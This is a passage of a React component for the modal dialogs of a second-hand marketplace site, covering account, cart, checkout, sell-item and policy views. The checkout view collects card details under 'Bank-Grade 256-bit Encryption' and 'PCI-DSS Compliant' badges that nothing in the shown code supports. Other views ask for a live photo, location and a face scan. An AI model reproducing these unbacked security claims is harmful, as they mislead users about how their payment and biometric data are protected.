                    <p className="font-medium text-gray-800">{currentUser.email}</p>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">Phone Number</label>
                    <p className="font-medium text-gray-800">{currentUser.phone || 'N/A'}</p>
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-gray-500 uppercase">Status</label>
                    <p className="font-medium text-gray-800 capitalize">
                      <span className={`px-2 py-1 rounded text-xs font-bold ${currentUser.status === 'approved' ? 'bg-green-100 text-green-700' : currentUser.status === 'rejected' ? 'bg-red-100 text-red-700' : 'bg-yellow-100 text-yellow-700'}`}>
                        {currentUser.status}
                      </span>
                    </p>
                  </div>
                </div>

                {currentUser.role === 'seller' && (
                  <div className="pt-4 border-t border-gray-200 mt-4">
                    <div className="flex justify-between items-center mb-4">
                      <h4 className="font-bold text-gray-800">My Products</h4>
                      <button 
                        onClick={() => {
                          if (onChangeFeature) onChangeFeature('Sell on Second Hand Market');
                        }}
                        className="text-xs bg-[#f85606] text-white px-3 py-1.5 rounded font-bold hover:bg-[#d04805] transition-colors"
                      >
                        Sell New Product
                      </button>
                    </div>
                    {sellerProducts.length > 0 ? (
                      <div className="space-y-3 max-h-48 overflow-y-auto pr-2">
                        {sellerProducts.map(product => (
                          <div key={product.id} className="flex items-center gap-3 p-2 border border-gray-200 rounded">
                            <img src={product.image} alt={product.name} className="w-12 h-12 object-cover rounded" />
                            <div className="flex-1">
                              <p className="font-medium text-sm text-gray-800 line-clamp-1">{product.name}</p>
                              <p className="text-xs text-gray-500">${product.price.toFixed(2)} • {product.status}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    ) : (
                      <p className="text-sm text-gray-500 italic">You haven't listed any products yet.</p>
                    )}
                  </div>
                )}

                {currentUser.role === 'buyer' && (
                  <div className="pt-4 border-t border-gray-200 mt-4">
                    <div className="flex justify-between items-center mb-4">
                      <h4 className="font-bold text-gray-800">My Orders</h4>
                      <button 
                        onClick={() => {
                          if (onChangeFeature) onChangeFeature('Track my Order');
                        }}
                        className="text-xs bg-gray-100 text-gray-700 px-3 py-1.5 rounded font-bold hover:bg-gray-200 transition-colors"
                      >
                        Track Order
                      </button>
                    </div>
                    <div className="bg-gray-50 p-4 rounded border border-gray-200 text-center">
                      <p className="text-sm text-gray-500">No recent orders found.</p>
                      <button 
                        onClick={onClose}
                        className="mt-2 text-sm text-[#f85606] font-medium hover:underline"
                      >
                        Start Shopping
                      </button>
                    </div>
                  </div>
                )}

                <div className="pt-4 border-t border-gray-200 mt-4">
                  <button 
                    onClick={() => {
                      if ('Notification' in window) {
                        Notification.requestPermission().then(permission => {
                          if (permission === 'granted') {
                            alert('Push notifications enabled! You will receive offers even when the app is closed.');
                          } else {
                            alert('Notifications were denied. Please enable them in your browser settings.');
                          }
                        });
                      } else {
                        alert('Your browser does not support push notifications.');
                      }
                    }}
                    className="text-sm bg-white border border-gray-300 text-gray-700 px-4 py-2 rounded font-bold hover:bg-gray-50 transition-colors w-full"
                  >
                    Enable Push Notifications for Offers
                  </button>
                </div>
              </div>
            </div>
          </div>
        );
      case 'Track my Order':
        return (
          <div className="space-y-4">
            <h3 className="font-bold text-gray-800 text-lg mb-2">Track Your Order</h3>
            <p className="text-sm text-gray-600 mb-4">Enter your order ID below to see its current status.</p>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Order ID</label>
              <input type="text" placeholder="e.g., ORD-123456" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
            </div>
            <button className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors mt-4">
              TRACK ORDER
            </button>
            <div className="mt-6 p-4 bg-gray-50 border border-gray-200 rounded text-sm text-gray-600">
              <p className="font-medium text-gray-800 mb-2">Recent Orders:</p>
              <ul className="list-disc pl-5 space-y-1">
                <li>No recent orders found.</li>
              </ul>
            </div>
          </div>
        );
      case 'Customer Care':
        if (step === 2) {
          return (
            <div className="text-center space-y-4 py-8">
              <div className="w-16 h-16 bg-green-100 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
                <ShieldCheck size={32} />
              </div>
              <h3 className="font-bold text-gray-800 text-xl">Inquiry Submitted!</h3>
              <p className="text-gray-600">Thank you for contacting us. Our team will review your request shortly.</p>
              <button onClick={onClose} className="mt-6 bg-[#f85606] text-white px-8 py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors">
                CLOSE
              </button>
            </div>
          );
        }
        return (
          <form onSubmit={handleContactSubmit} className="space-y-4">
            <p className="text-gray-600 text-sm">We're here to help! Send us a message and our team will get back to you shortly.</p>
            {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Your Name</label>
              <input type="text" value={name} onChange={e => setName(e.target.value)} required placeholder="Enter your name" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
              <input type="email" value={email} onChange={e => setEmail(e.target.value)} required placeholder="Enter your email" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Issue Type</label>
              <select value={issueType} onChange={e => setIssueType(e.target.value)} className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] bg-white">
                <option value="Order Inquiry">Order Inquiry</option>
                <option value="Returns & Refunds">Returns & Refunds</option>
                <option value="Payment Issue">Payment Issue</option>
                <option value="Account Help">Account Help</option>
                <option value="Other">Other</option>
              </select>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Message</label>
              <textarea value={message} onChange={e => setMessage(e.target.value)} required placeholder="Describe your issue in detail..." className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] h-24 resize-none"></textarea>
            </div>
            <button type="submit" className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors">
              SUBMIT TICKET
            </button>
            <div className="mt-6 pt-4 border-t border-gray-200 text-center">
              <p className="text-sm text-gray-500 mb-1">Prefer to call?</p>
              <p className="text-[#f85606] text-xl font-black tracking-wider">1-800-SHM-HELP</p>
            </div>
          </form>
        );
      case 'Save More on App':
        return (
          <div className="text-center space-y-6">
            <div className="w-48 h-48 bg-gray-100 mx-auto flex flex-col items-center justify-center rounded-xl border-2 border-dashed border-gray-300 p-4">
              <div className="w-32 h-32 bg-white border-4 border-black p-2 flex flex-wrap gap-1">
                {/* Mock QR Code Pattern */}
                {Array.from({length: 16}).map((_, i) => (
                  <div key={i} className={`w-6 h-6 ${Math.random() > 0.5 ? 'bg-black' : 'bg-white'}`}></div>
                ))}
              </div>
            </div>
            <div>
              <h3 className="text-lg font-bold text-gray-800 mb-2">Scan to Download</h3>
              {appOffer.isActive ? (
                <div className="bg-orange-50 border border-orange-200 p-4 rounded-lg mb-4">
                  <p className="text-gray-800 font-medium mb-2">
                    Limited Time Offer: Get <span className="font-bold text-[#f85606]">{appOffer.discount}</span> on your first in-app purchase!
                  </p>
                  <div className="flex items-center justify-center gap-2">
                    <span className="text-sm text-gray-500">Use code:</span>
                    <span className="font-mono font-bold bg-white px-3 py-1 border border-dashed border-gray-400 rounded text-[#f85606] tracking-wider">
                      {appOffer.code}
                    </span>
                  </div>
                  <p className="text-xs text-gray-500 mt-2">Valid until: {new Date(appOffer.validUntil).toLocaleDateString()}</p>
                </div>
              ) : (
                <p className="text-gray-600 text-sm">Download the Second Hand Market app for the best shopping experience!</p>
              )}
            </div>
            <div className="flex gap-4 justify-center">
              <a href="https://www.apple.com/app-store/" target="_blank" rel="noopener noreferrer" className="bg-black text-white px-4 py-2 rounded flex items-center gap-2 text-sm font-bold hover:bg-gray-800 transition-colors">
                App Store
              </a>
              <a href="https://play.google.com/store/apps" target="_blank" rel="noopener noreferrer" className="bg-black text-white px-4 py-2 rounded flex items-center gap-2 text-sm font-bold hover:bg-gray-800 transition-colors">
                Google Play
              </a>
            </div>
          </div>
        );
      case 'Sell on Second Hand Market':
        if (!currentUser) {
          return (
            <div className="text-center py-8 space-y-4">
              <p className="text-gray-600">You need to login or sign up as a Seller to list products.</p>
              <button onClick={() => onChangeFeature?.('Login')} className="bg-[#f85606] text-white px-8 py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors">
                LOGIN TO SELL
              </button>
            </div>
          );
        }
        if (currentUser.role !== 'seller' && currentUser.role !== 'admin') {
          return (
            <div className="text-center py-8 space-y-4">
              <p className="text-red-600 font-medium">Access Denied</p>
              <p className="text-gray-600">Only registered sellers can list products. Your account is currently a Buyer account.</p>
              <button onClick={onClose} className="bg-gray-200 text-gray-800 px-8 py-2.5 rounded font-bold hover:bg-gray-300 transition-colors">
                CLOSE
              </button>
            </div>
          );
        }
        
        if (step === 1) {
          return (
            <form onSubmit={handleSellStep1} className="space-y-4">
              <p className="text-gray-600 text-sm mb-4">Turn your old items into cash! List your product for admin approval.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Product Title</label>
                <input type="text" value={productTitle} onChange={e => setProductTitle(e.target.value)} required placeholder="What are you selling?" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Price (Rs.)</label>
                <input type="number" value={productPrice} onChange={e => setProductPrice(e.target.value)} required placeholder="Enter price" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <button type="submit" className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors mt-2 flex items-center justify-center gap-2">
                NEXT: ADD PHOTO <Camera size={18} />
              </button>
            </form>
          );
        } else if (step === 2) {
          return (
            <div className="space-y-4">
              <h3 className="font-bold text-gray-800 text-center">Product Photo</h3>
              <p className="text-sm text-gray-600 text-center mb-4">Please take a live photo of the product you want to sell.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              <CameraCapture onCapture={handleSellStep2} />
              
              <button onClick={() => setStep(1)} className="w-full bg-gray-100 text-gray-700 py-2.5 rounded font-bold hover:bg-gray-200 transition-colors mt-2">
                BACK
              </button>
            </div>
          );
        } else if (step === 3) {
          return (
            <div className="space-y-6 text-center">
              <h3 className="font-bold text-gray-800">Location Access Required</h3>
              <p className="text-sm text-gray-600">To ensure safe transactions, we require your current location to list this product.</p>
              {error && <div className="text-red-500 text-sm bg-red-50 p-2 rounded">{error}</div>}
              
              <button onClick={handleSellStep3} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold hover:bg-[#d04805] transition-colors mt-2">
                ALLOW LOCATION & SUBMIT
              </button>
            </div>
          );
        }
        break;
      case 'Cart':
        if (cart.length === 0) {
          return (
            <div className="text-center py-12 px-4 flex flex-col items-center justify-center">
              <div className="relative mb-6">
                <div className="w-32 h-32 bg-orange-50 rounded-full flex items-center justify-center mx-auto">
                  <ShoppingBag size={56} className="text-[#f85606] opacity-80" />
                </div>
                <div className="absolute -bottom-2 -right-2 w-10 h-10 bg-white rounded-full shadow-md flex items-center justify-center border border-gray-100">
                  <span className="text-gray-400 font-bold text-lg">0</span>
                </div>
              </div>
              <h3 className="text-2xl font-bold text-gray-800 mb-2">Your Cart is Empty</h3>
              <p className="text-gray-500 max-w-xs mx-auto mb-8 leading-relaxed">
                Looks like you haven't added anything yet. Discover amazing deals and second-hand treasures today!
              </p>
              <button 
                onClick={onClose} 
                className="bg-[#f85606] text-white px-10 py-3.5 rounded-lg font-bold hover:bg-[#d04805] transition-all transform hover:scale-105 shadow-md shadow-orange-200 flex items-center gap-2"
              >
                START SHOPPING
              </button>
            </div>
          );
        }
        return (
          <div className="space-y-4">
            <h3 className="font-bold text-lg text-gray-800 border-b pb-2">Your Cart</h3>
            <div className="max-h-[40vh] overflow-y-auto space-y-4 pr-2">
              {cart.map(item => (
                <div key={item.product.id} className="flex gap-4 items-center border-b border-gray-100 pb-4">
                  <img src={item.product.image} alt={item.product.title} className="w-16 h-16 object-cover rounded" />
                  <div className="flex-1">
                    <h4 className="font-medium text-gray-800 text-sm line-clamp-1">{item.product.title}</h4>
                    <p className="text-[#f85606] font-bold text-sm mt-1">Rs. {item.product.price.toLocaleString()}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-sm text-gray-500">Qty: {item.quantity}</span>
                    <button onClick={() => removeFromCart(item.product.id)} className="text-red-500 hover:text-red-700 p-1">
                      <X size={16} />
                    </button>
                  </div>
                </div>
              ))}
            </div>
            <div className="pt-4 border-t border-gray-200">
              <div className="flex justify-between items-center mb-4">
                <span className="font-bold text-gray-700">Total:</span>
                <span className="font-bold text-[#f85606] text-xl">Rs. {cartTotal.toLocaleString()}</span>
              </div>
              <button onClick={() => onChangeFeature?.('Checkout')} className="w-full bg-[#f85606] text-white py-3 rounded font-bold hover:bg-[#d04805] transition-colors flex justify-center items-center gap-2">
                PROCEED TO CHECKOUT
              </button>
            </div>
          </div>
        );
      case 'Checkout':
        if (paymentSuccess) {
          return (
            <div className="text-center py-8 space-y-4">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <ShieldCheck size={40} className="text-green-600" />
              </div>
              <h3 className="text-2xl font-bold text-gray-800">Payment Successful!</h3>
              <p className="text-gray-600">Rs. {cartTotal.toLocaleString()} has been securely deducted from your account.</p>
              <p className="text-sm text-gray-500">Your order is confirmed and will be shipped soon.</p>
            </div>
          );
        }
        return (
          <form onSubmit={handleCheckout} className="space-y-4">
            <div className="flex items-center justify-center gap-2 text-green-700 bg-green-50 p-3 rounded mb-4 border border-green-200">
              <Lock size={16} />
              <span className="text-sm font-bold">Bank-Grade 256-bit Encryption</span>
            </div>
            
            <div className="flex justify-between items-center mb-4 pb-4 border-b border-gray-200">
              <span className="font-medium text-gray-700">Total Amount to Pay:</span>
              <span className="font-bold text-xl text-[#f85606]">Rs. {cartTotal.toLocaleString()}</span>
            </div>

            <div className="space-y-3">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
                <input type="text" required placeholder="Name on card" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606]" />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
                <div className="relative">
                  <input type="text" required maxLength={19} placeholder="XXXX XXXX XXXX XXXX" className="w-full px-4 py-2 pl-10 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] font-mono" />
                  <CreditCard size={18} className="absolute left-3 top-2.5 text-gray-400" />
                </div>
              </div>
              <div className="flex gap-4">
                <div className="flex-1">
                  <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
                  <input type="text" required maxLength={5} placeholder="MM/YY" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] text-center" />
                </div>
                <div className="flex-1">
                  <label className="block text-sm font-medium text-gray-700 mb-1">CVV/CVC</label>
                  <input type="password" required maxLength={4} placeholder="123" className="w-full px-4 py-2 border border-gray-300 rounded focus:outline-none focus:border-[#f85606] text-center" />
                </div>
              </div>
            </div>

            <div className="flex items-center gap-4 py-4 justify-center opacity-70">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4 object-contain" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6 object-contain" />
              <span className="text-xs font-bold text-gray-500 flex items-center gap-1"><ShieldCheck size={14}/> PCI-DSS Compliant</span>
            </div>

            <button type="submit" disabled={isProcessing} className={`w-full py-3 rounded font-bold text-white transition-colors flex justify-center items-center gap-2 ${isProcessing ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#f85606] hover:bg-[#d04805]'}`}>
              {isProcessing ? (
                <>Processing Payment...</>
              ) : (
                <><Lock size={18} /> PAY SECURELY</>
              )}
            </button>
          </form>
        );
      case 'Help Center':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Frequently Asked Questions</h3>
            <div className="space-y-3">
              <div>
                <h4 className="font-bold">How do I track my order?</h4>
                <p className="text-gray-600">You can track your order by clicking on "Track my Order" at the top of the page and entering your order ID.</p>
              </div>
              <div>
                <h4 className="font-bold">What payment methods are accepted?</h4>
                <p className="text-gray-600">We accept Cash on Delivery (COD), Credit/Debit Cards, and mobile wallets like eSewa and Khalti.</p>
              </div>
              <div>
                <h4 className="font-bold">How do I contact the seller?</h4>
                <p className="text-gray-600">You can contact the seller directly from the product page using the "Chat" feature once you are logged in.</p>
              </div>
            </div>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              CLOSE
            </button>
          </div>
        );
      case 'How to Buy':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Step-by-Step Guide</h3>
            <ol className="list-decimal pl-5 space-y-2 text-gray-600">
              <li><strong>Search or Browse:</strong> Find the item you want using the search bar or category menu.</li>
              <li><strong>Check Details:</strong> Read the product description, check the price, and review seller ratings.</li>
              <li><strong>Add to Cart:</strong> Click "Add to Cart" or "Buy Now" to proceed.</li>
              <li><strong>Login/Register:</strong> If you haven't already, log in to your account.</li>
              <li><strong>Checkout:</strong> Enter your delivery address and choose a payment method.</li>
              <li><strong>Confirm:</strong> Review your order and click "Place Order".</li>
            </ol>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              GOT IT
            </button>
          </div>
        );
      case 'Returns & Refunds':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Return Policy</h3>
            <p className="text-gray-600">We offer a 14-day free and easy return policy for most items. To be eligible for a return, your item must be unused and in the same condition that you received it.</p>
            <h4 className="font-bold mt-4">How to initiate a return:</h4>
            <ul className="list-disc pl-5 space-y-1 text-gray-600">
              <li>Go to your Account &gt; My Orders</li>
              <li>Select the order and click "Return Item"</li>
              <li>Choose the reason for return and submit</li>
              <li>Drop off the item at our nearest hub or schedule a pickup</li>
            </ul>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              CLOSE
            </button>
          </div>
        );
      case 'About Second Hand Market':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-[#f85606] rounded-full flex items-center justify-center text-white font-bold text-xl">SHM</div>
            </div>
            <p className="text-gray-600 leading-relaxed">Second Hand Market (SHM) is your premier destination for buying and selling pre-loved goods. Our mission is to promote sustainable commerce by giving items a second life.</p>
            <p className="text-gray-600 leading-relaxed">Founded in 2026, we connect thousands of buyers and sellers daily, ensuring safe, secure, and seamless transactions across the country.</p>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              CLOSE
            </button>
          </div>
        );
      case 'Careers':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Join Our Team</h3>
            <p className="text-gray-600 mb-4">We are always looking for talented individuals to join our growing team. Check out our open positions below:</p>
            <div className="space-y-3">
              <div className="p-3 border border-gray-200 rounded hover:border-[#f85606] cursor-pointer transition-colors">
                <h4 className="font-bold text-[#f85606]">Senior Frontend Developer</h4>
                <p className="text-xs text-gray-500">Kathmandu • Full-time</p>
              </div>
              <div className="p-3 border border-gray-200 rounded hover:border-[#f85606] cursor-pointer transition-colors">
                <h4 className="font-bold text-[#f85606]">Customer Support Executive</h4>
                <p className="text-xs text-gray-500">Remote • Full-time</p>
              </div>
              <div className="p-3 border border-gray-200 rounded hover:border-[#f85606] cursor-pointer transition-colors">
                <h4 className="font-bold text-[#f85606]">Marketing Manager</h4>
                <p className="text-xs text-gray-500">Pokhara • Full-time</p>
              </div>
            </div>
            <button onClick={onClose} className="w-full bg-gray-100 text-gray-800 py-2.5 rounded font-bold mt-4 hover:bg-gray-200 transition-colors">
              VIEW ALL OPENINGS
            </button>
          </div>
        );
      case 'Second Hand Market Blog':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Latest Articles</h3>
            <div className="space-y-4">
              <div className="flex gap-3 cursor-pointer group">
                <img src="https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=100&h=100&fit=crop" alt="Blog 1" className="w-20 h-20 object-cover rounded" />
                <div>
                  <h4 className="font-bold group-hover:text-[#f85606] transition-colors line-clamp-2">5 Tips for Taking Great Product Photos</h4>
                  <p className="text-xs text-gray-500 mt-1">March 10, 2026</p>
                </div>
              </div>
              <div className="flex gap-3 cursor-pointer group">
                <img src="https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=100&h=100&fit=crop" alt="Blog 2" className="w-20 h-20 object-cover rounded" />
                <div>
                  <h4 className="font-bold group-hover:text-[#f85606] transition-colors line-clamp-2">How to Price Your Used Items Competitively</h4>
                  <p className="text-xs text-gray-500 mt-1">March 5, 2026</p>
                </div>
              </div>
            </div>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              READ MORE ON BLOG
            </button>
          </div>
        );
      case 'Terms & Conditions':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Terms & Conditions</h3>
            <div className="h-48 overflow-y-auto pr-2 space-y-3 text-gray-600 text-xs border p-3 rounded bg-gray-50">
              <p><strong>1. Introduction</strong><br/>Welcome to Second Hand Market. By accessing our platform, you agree to these terms.</p>
              <p><strong>2. User Accounts</strong><br/>You must be at least 18 years old to create an account. You are responsible for maintaining the confidentiality of your account credentials.</p>
              <p><strong>3. Listing Items</strong><br/>Sellers must provide accurate descriptions and images of their items. Counterfeit or illegal items are strictly prohibited.</p>
              <p><strong>4. Transactions</strong><br/>All transactions are between the buyer and the seller. Second Hand Market provides the platform but is not a party to the contract of sale.</p>
              <p><strong>5. Fees</strong><br/>Listing items is free, but we may charge a small commission on successful sales.</p>
            </div>
            <div className="flex items-center gap-2 mt-2">
              <input type="checkbox" id="accept-terms" className="rounded text-[#f85606] focus:ring-[#f85606]" />
              <label htmlFor="accept-terms" className="text-xs font-medium">I have read and agree to the Terms & Conditions</label>
            </div>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              ACCEPT & CLOSE
            </button>
          </div>
        );
      case 'Privacy Policy':
        return (
          <div className="space-y-4 text-sm text-gray-700">
            <h3 className="font-bold text-lg text-gray-800 mb-2">Privacy Policy</h3>
            <div className="h-48 overflow-y-auto pr-2 space-y-3 text-gray-600 text-xs border p-3 rounded bg-gray-50">
              <p><strong>Information We Collect</strong><br/>We collect information you provide directly to us, such as when you create or modify your account, contact customer support, or list an item.</p>
              <p><strong>How We Use Your Information</strong><br/>We use the information we collect to provide, maintain, and improve our services, as well as to process transactions and send related information.</p>
              <p><strong>Information Sharing</strong><br/>We may share your information with vendors, consultants, and other service providers who need access to such information to carry out work on our behalf.</p>
              <p><strong>Data Security</strong><br/>We take reasonable measures to help protect information about you from loss, theft, misuse and unauthorized access.</p>
              <p><strong>Your Choices</strong><br/>You may update, correct or delete information about you at any time by logging into your online account.</p>
            </div>
            <button onClick={onClose} className="w-full bg-[#f85606] text-white py-2.5 rounded font-bold mt-4 hover:bg-[#d04805] transition-colors">
              I UNDERSTAND
            </button>
          </div>
        );
      case 'Identity Verification':
        return (
          <div className="py-4">
             <FaceScanLandingPage onComplete={onClose} variant="hero" />
          </div>
        );
      default:
        return (
          <div className="text-center py-8">
            <p className="text-gray-600">This feature is currently under development.</p>
            <button onClick={onClose} className="bg-[#f85606] text-white px-6 py-2 rounded font-bold mt-6">
              GO BACK
            </button>
          </div>
        );
    }
  };

  return (
    <div className="fixed inset-0 bg-black/60 z-[100] flex items-center justify-center p-4 backdrop-blur-sm animate-in fade-in duration-200">
      <div className="bg-white rounded-lg shadow-2xl w-full max-w-md overflow-hidden animate-in zoom-in-95 duration-200">
        <div className="flex justify-between items-center p-4 border-b border-gray-100 bg-gray-50">
          <h2 className="text-lg font-bold text-gray-800">{feature === 'LoginOnly' ? 'Login' : feature}</h2>
          <button onClick={onClose} className="text-gray-400 hover:text-gray-800 transition-colors p-1 rounded-full hover:bg-gray-200">
            <X size={20} />
          </button>
        </div>
        <div className="p-6 max-h-[80vh] overflow-y-auto">
          {renderContent()}
        </div>
      </div>
    </div>
  );
}
